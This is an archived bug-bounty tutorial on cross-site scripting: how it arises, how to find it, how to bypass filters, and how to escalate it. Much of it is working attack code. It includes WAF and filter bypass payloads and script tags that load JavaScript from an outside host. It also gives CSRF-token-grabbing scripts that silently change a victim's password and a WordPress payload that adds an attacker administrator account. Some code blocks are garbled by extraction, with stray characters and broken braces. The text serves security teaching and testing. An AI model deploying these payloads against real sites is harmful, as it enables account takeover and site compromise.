# The Ultimate Guide to Finding and Escalating XSS Bugs

- **Source URL:** https://medium.com/@proseizala/the-ultimate-guide-to-finding-and-escalating-xss-bugs-22894ef03fc4?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240717035743/https://medium.com/@proseizala/the-ultimate-guide-to-finding-and-escalating-xss-bugs-22894ef03fc4
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6660 (id 6660)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# The Ultimate Guide to Finding and Escalating XSS Bugs

# Learn More About Cyber Security , Hacking And Get Your First Certificate For Free On : [https://alison.com/tag/it-security?utm\_source=alison\_user&utm\_medium=affiliates&utm\_campaign=40731788](https://alison.com/tag/it-security?utm_source=alison_user&utm_medium=affiliates&utm_campaign=40731788)

lets get started :

# What is XSS?

Cross-Site Scripting (XSS) is the most common vulnerability discovered on web applications. It occurs when an attacker is able to execute client-side JavaScript in another user’s browser.

XSS is a very interesting and dynamic bug class for a number of reasons.

- The severity can range anywhere from informative to critical, depending on the application and context
- It can result in remote command execution in some contexts
- Due to the dynamic nature of the bug class, it’s difficult to prevent against from a development standpoint
- More complex XSS vulnerabilities will be mostly missed by automated tooling

Gaining an XSS on a vulnerable application may give an attacker the ability to:

- Steal session tokens, giving them full control of the user’s session
- Bypass Same Origin Policy (SOP), allowing them to perform sensitive actions as if they were logged the victim user
- Exfiltrate information that is viewable by the victim user, for example

In a worst case scenario, the vulnerability may be chained as a worm to affect users exponentially, as demonstrated [here](https://labs.bishopfox.com/tech-blog/2017/06/how-i-built-an-xss-worm-on-atmail) and [here](<https://en.wikipedia.org/wiki/Samy_(computer_worm)>).

# The Root Cause of XSS vulnerabilities

XSS occurs when user input is not properly escaped when it is reflected back to the application, allowing client-side JavaScript to be injected in a manner allows it to execute.

## Basic Example

To fully understand what this all means, let’s take a look at a basic example. Below is some HTML and PHP code for a very basic (and vulnerable) application.

```
<html>
<head><title>MyApp</title></head>
<body>
```
Welcome to MyApp, \<?php echo $\_GET\['name'\]; ?>\</body>

\</html>

If you’d like to follow along, create a new empty directory somewhere, then pop the above code into a file called index.php. While you’re inside that directory, run **php -S localhost:8000**

You should get something like this:

You can change ‘hakluke’ to anything you want in the URL, and it will be reflected back in the application. And when I say ‘anything you want’ I mean literally anything. For example, if we want to make the text bold, we could use

`http://localhost:8000/?name=<b>hakluke</b>`
Why stop there though? Let’s try embedding an image:

`http://localhost:8000/?name=%3Cimg%20src=%22https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg%22%3E`
By now, you might be seeing the problem. The text that is being entered into the name field is being interpreted as valid HTML, instead of printing as normal text.

If you’re wondering why there are % symbols and numbers in the URL, this is just URL encoding. It allows us to put any characters into a URL without breaking the URL. A common example is %20, which translates to a space character. Obviously spaces within URLs would not be ideal because that would split the URL into two words, so we use ‘%20’ instead. You can easily encode or decode URL encoded strings using an online tool such as [this one](https://meyerweb.com/eric/tools/dencoder/).

From here, it’s not a huge leap to imagine that we can also inject javascript. The decoded payload I’m using is **\<script>alert("xss")\</script>**

`http://localhost:8000/?name=%3Cscript%3Ealert(%22xss%22)%3C/script%3E`
The ability to inject JavaScript here is what makes it an XSS vulnerability, instead of a boring old HTML injection.

# Types of XSS

XSS comes in many different forms, but we can categorize them all into a few categories.

## Reflected XSS

Reflected XSS occurs when JavaScript is injected into a request, and reflected and executed directly in the response.

## Persistent/Stored XSS

*Persistent* or *stored* XSS occurs when the injected JavaScript is stored somewhere like a database. Once the payload has been set, it will be reflected back onto a vulnerable page whether the request contains the payload or not.

## DOM XSS

DOM XSS occurs when the injection is reflected by client-side JavaScript. The cause is a little different to other types of XSS, but the exploitation and severity is roughly the same.

## Self XSS

Self-XSS is a non-harmful form of XSS where you can inject XSS but only onto a page that you can view, meaning that you can only run JavaScript in the context of your own browser. This type of XSS is an indicator of a bad development practice, but can not be exploited by itself. In some cases, we can chain self-XSS with another vulnerability such as CSRF to make it exploitable, but that’s for another blog post.

# Context is Everything

When you start considering how many different contexts user input may be injected into, it becomes apparent why it’s difficult to detect XSS vulnerabilities in an automated fashion. Let’s take a look at a few of the different contexts that you might encounter:

## Inside Normal HTML Tags

`<p>{{injection}}</p>`
## Double Quoted HTML Tag Attributes

`<input type="text" value="{{injection}}">`
## Single Quoted HTML Tag Attributes

`<input type="text" value='{{injection}}'>`
## Unquoted HTML Tag Attributes

`<input type="text" value={{injection}}>`
## HTML Comments

`<!-- {{injection}} -->`
## HTML Event Handlers

`<img src=x onerror="{{injection}}">`
## Within Script Tags

`<script>var x = "{{injection}}";</script>`
## URLs

`<a href="{{injection}}">click me</a>`
The list above is non-exhaustive, there are *many* other contexts that you will encounter in your quest to uncover XSS vulnerabilities. The most important thing is that you are aware of the context that you are injecting into, and have some idea of how you might be able to escape or abuse that context to achieve XSS.

# XSS Discovery Methods

## Manual

Nothing will uncover XSS vulnerabilities as thoroughly as manually going through each parameter, testing for injection, checking the context, and attempting to exploit it manually. It can be a slow, grinding process, but ultimately going to this much trouble will allow you to uncover vulnerabilities that others will miss.

## XSS Polyglots

An XSS polyglot is a string that is able to inject into multiple different contexts and still result in JavaScript execution. One of the most famous XSS polyglots was created by 0xSobky. I’ve included it below. It works in over 20 contexts, so spraying this throughout an application is a decent way to discover XSS vulnerabilities.

``jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e``
You can find the full details including an analysis by visiting the dedicated [Github repository](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot).

The downside to polyglots is that they’re easily detected by web application firewalls (WAFs), they tend to be quite long in terms of character length, and they don’t work in every context.

## Automated Scanners

There are approximately 1 bajillisquillion XSS scanner tools on the internet (citation needed). Most of them are quite terrible. Having said that, I’ve had some success with Burp Suite’s active scanning capabilities, but honestly it still misses a lot. This is especially true when the XSS is injected on one page in the application, and then executed on a totally different page, which is quite a common scenario. It is very difficult to give automated scanners the human intuition that is required to navigate through pages of an application to discover XSS vulnerabilities that require multiple steps.

That being said, there are a couple of paid tools that hook into your Chrome browser in order to aid you in the discovery of XSS vulnerabilities. The one that is top of mind for me is [Wingman](https://xsswingman.com/blog/posts/announcing-wingman/). It’s currently a paid tool, and I am hesitant to recommend it fully because I am still in the process of testing it but so far it is very good. I have tested it out on some websites that I know have XSS vulnerabilities, and it has discovered them easily. It does have some improvements to be made in terms of output and usability, but the most important part (the actual detection of the vulnerabilities) appears to be very fast and accurate compared to existing tools that I have tried.

With a bit of creativity, you might also be able to think of some ways to automate the discovery of basic reflected XSS vulnerabilities by simply modifying inputs and analysing the response.

## Basic XSS Filter Bypasses

Sometimes, you will run into a situation where there is some kind of filter that is stopping you from being able to insert your payloads. These filters vary in strength — a poor filter is easy to bypass while more mature filters are more difficult, or impossible. The most basic (and ineffective) filter is a simple string search. For example, there might be some logic in the backend that searches for the word “script”, and returns a 403 error if it is found.

The backend code might look something like this:

```
<html>
<head><title>MyApp</title></head>
<body>
```
\<?php

$name = $\_GET\['name'\];

if (strpos($name, 'script') !== false) {

ÊÊÊhttp\_response\_code(403);

ÊÊÊdie('Forbidden');

}

?>Welcome to MyApp, \<?php echo $\_GET\['name'\]; ?>\</body>

\</html>

Now, if we try to inject **\<script>alert(1)\</script>**

## HTML Event Attributes

We’re not cooked just yet, because there are many ways to execute JavaScript without **\<script>**

`<img src=x onerror=alert(1)>`
The full URL would be:

[http://localhost:8000/?name=%3Cimg%20src=x%20onerror=alert(1)%3E](http://localhost:8000/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E)

And the result:

In this case, we’ve used a handy little feature called HTML Event Attributes. They allow you to specify JavaScript to execute when a specific event occurs. In this case, we have attempted to load an image with the src attribute set to “x”. Of course, there is no image hosted at “x”, so an error occurs. When an error occurs, the onerror Event attribute is fired, which we set to be **alert(1)**[here](https://www.w3schools.com/tags/ref_eventattributes.asp).

## Alert is blocked

Another common blacklisted word is “alert”, which can be bypassed easily by using **prompt(1), console.log(1)**

## Brackets ( ) are blocked

Javascript is a strange language. For some reason it allows you to use backticks instead of brackets when passing strings to a function. i.e. **alert\`1\`****alert(1)**

# Strings are blocked

Sometimes you will run into situations where you can not form a string, maybe because quotes are blocked, or some other reason. In this case, String.fromCharCode can be really handy. It takes ASCII codes, and then turns them into a string, for example this payload:

`alert(String.fromCharCode(88,83,83))`
Will create an alert box with the characters corresponding to 88, 83 and 83. Which just happens to be XSS:

If you don’t know what that weird console thing is yet, don’t worry, we’ll get to that.

## Other Bypasses

Bypassing XSS filters is a very, very deep rabbit hole. People dedicate their lives to this kind of stuff. Just as an example, here’s a Cloudflare WAF bypass from 2019:

The tweet is here: [https://twitter.com/bohdansec/status/1135699501707091968](https://twitter.com/bohdansec/status/1135699501707091968)

The payload is: **\<svg onload=prompt%26%230000000040document.domain)>**

It works by adding 8+ superfluous leading zero’s to the start of a decimal (or hex) encoded character, which Cloudflare did not account for in their checks.

These kinds of bypasses pop up every now and then for major WAFs, and many bug bounty hunters have their own ones that they keep secret. Once they’re publicly known, they tend to get patched fairly quickly by WAF vendors.

This is my favorite resource for more advanced filter bypass examples:

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads)

# XSS Escalation Methods

Before we start on escalation methods, let me introduce the browser console, which many of you will already know about, but just in case:

## The Browser Console

Major browsers have JavaScript consoles that you can open. I’ll be using the Firefox one for this demo, but they’re all basically the same. To open the console in Firefox (and Chrome), press F12.

You’ll be greeted with something like this:

Any JavaScript that you enter in here will be executed within the context of the current page that you are on, as if it was embedded directly into that page. For example, in the image below, we pop an alert box with **document.domain**

Using the console is an *excellent* way to test more complex payloads, which we will be getting into a bit further down the document. For now, just know that the console exists.

## Including Longer Payloads

If you’re escalating your XSS beyond an alert box, it’s quite likely that you will want to include a much longer script. This can be done by loading an external .js file. There are a couple of ways to do this. The most generic way is simply to provide a src attribute in a script tag:

`<script src="http://nw.rs"></script>`
The page at [http://nw.rs](http://nw.rs) just happens to include some basic JavaScript as shown below, but it could include any length of JavaScript, even thousands of lines.

Another method of loading external JavaScript is using JQuery’s getScript() function:

`$.getScript("http://nw.rs",function(){});`
Most modern applications will have JQuery at your disposal, so this is a very handy tip if your XSS is in a JavaScript context, rather than a HTML one.

**A word of warning:** if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error.

## Bypassing the SOP

Perhaps the greatest thing about finding XSS on an application is that it allows you to completely bypass the Same Origin Policy (SOP). The SOP basically forbids JavaScript from one origin requesting data from another origin unless it is explicitly allowed by a CORS policy. If you find an XSS on the target application, you really don’t need to worry about this, because the JavaScript that you inject will be executed within that application as if it had been hard coded. In other words, the JavaScript that you inject is already coming from the same origin!

Additionally, if the exploited user is authenticated to the vulnerable application, your JavaScript will be executing within the context of that authenticated session.

Why is this so important? Because it means that the JavaScript you inject has the power to do pretty much anything that the user can do. This might include submitting forms, updating profile details, making comments, installing plugins, updating passwords etc.

## Bypassing CSRF Tokens

Once we have XSS, how can we submit a form that requires a CSRF token? There are a couple of different methods. The first is by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, and we can simply interact with that form using JavaScript. This method was shown to me by [Justin Gardner](mailto:justin@rhynorater.com) (Rhynorater). The code is also available in one of my Github repositories, which we’ll look at later in [this blog](https://raw.githubusercontent.com/hakluke/weaponised-XSS-payloads/master/iframe_template.js.).

```
frame=document.createElement("iframe")
frame.addEventListener("load", function() {
    // Wait 1 second after the iframe loads to ensure that the DOM has loaded
    setTimeout(function(){
        //Set new password
```
frame.contentDocument.getElementById("NewPassword").value="1337H4x0rz!!!"

//Set confirm passwordframe.contentDocument.getElementById("ConfirmNewPassword").value="1337H4x0rz!!!"

//Click the submit button

frame.contentDocument.getElementById("SubmitButton").click()

setTimeout(function(){

//Wait a couple seconds for the previous request to be sent

alert("Your account password has been changed to 1337H4x0rz!!!")

, 2000)

, 1000)

});frame.src="https://example.com/sensitive/action.php"

document.body.append(frame)

The other method is a little more complicated, but I think that it creates more reliable payloads. Essentially, you request the page that contains the form, pull out the CSRF token using regex, and then include that token in your form request. Here’s an example of that method on a fictitious application.

```
var req = new XMLHttpRequest();
var url = "/changepassword.php";
var regex = /token" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "action=changepassword&csrf_token="+nonce+"&new_password=pwn3d";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
```
## Account Takeovers

Now that we can bypass SOP and CSRF protections, it is quite trivial to build a PoC that will take control of a user’s account either by updating their password directly, or updating their email address (which can then be used to reset the password through the forgot password functionality).

I wrote a [whole blog about escalating XSS using these methods](/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4), but to summarise, we use the methods above to change the user’s profile in a way that would allow an account takeover. For example, we could:

- Change the user’s password
- Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
- Change the user’s security questions

I also included a [repository full of payloads for popular platforms](https://github.com/hakluke/weaponised-XSS-payloads) such as WordPress, Drupal and MyBB. As an example, here’s a payload that will add a new admin user on a WordPress instance.

```
var wp_root = "http://example.com" // don't add a trailing slash
var req = new XMLHttpRequest();
var url = wp_root + "/wp-admin/user-new.php";
var regex = /ser" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var nonce = regex.exec(req.responseText);
var nonce = nonce[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=hacker@example.com&pass1=AttackerP455&pass2=AttackerP455&role=administrator";
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
```
# Other Cases

Below are a few random cases that didn’t really fit into the narrative of the blog post, but I think are still valuable to know about.

## Length Limited Payloads

Sometimes, you’ll get an injection that needs to be under a specific amount of characters. The shortest payload I know of that does not pull an external script is 20 characters long:

`<svg/onload=alert()>`
The shortest payload I know of that does pull an external script is 27 characters:

`<script/src=//_._></script>`
This payload uses a trick where a single unicode character gets split into two normal characters by the browser, which means that you can take a 5 character domain such as nw.rs and shorten it down to 3 characters: ㎻.₨, the browser will just convert it back to 5 characters and fetch the script as if nothing happened.

Note that the payloads above are the shortest ones I know of that can be executed within a plain HTML context. In other contexts, you may have much shorter payloads, for example, you might already be in a JavaScript context, where the whole payload could just be **alert(1)**.

## Link Injection

You can execute JavaScript with the javascript: protocol. Don’t believe me? Go ahead, paste **javascript:alert(document.domain)** into your browser’s address bar right now, and press enter!

This can be injected into anywhere that a link will exist, for example, in a \<a> tag:

`<a href="javascript:alert(document.domain)>click me</a>`
When that link is clicked, the JavaScript will execute.

## Referer Header XSS

This hasn’t really been possible since IE6, except maybe in some extremely rare cases. The reason is that key characters within the Referer header value are URL encoded by the browser. If you want to give this a shot for yourself, you can use this PHP code:

```
<html>
<head><title>MyApp</title></head>
<body>
```
Welcome to MyApp.\<?php echo $\_SERVER\['HTTP\_REFERER'\]; ?>;\</body>

\</html>

Then run the following JavaScript code in the console:

```
window.history.replaceState(null, '', "<script>alert(1)</script>");
window.location.replace('http://localhost:8000/');
```
Notice that the outcome has URL encoding for some key characters:

The actual alert(1) remains intact, so there are still some edge cases where it might work, but it would be very rare.

## RCE via XSS in Electron Apps

Electron is pretty nifty, it allows you to build desktop and mobile applications with JavaScript, HTML and CSS. Apps like VSCode, Slack, Facebook Messenger and Twitch are all built using Electron. There’s a feature called nodeIntegration, which basically allows you to run nodejs code within the application. The risks of doing this are pretty well advertised, but as with all horribly insecure misconfigurations, it still finds its way into production sometimes.

If you manage to pop an XSS in an Electron application, and nodeIntegration is enabled, you’ve got yourself a nifty little remote code execution!

For more information about this attack, I’d recommend checking Portswigger’s great writeup of the famous Discord XSS > RCE bug, which utilized a very similar method.
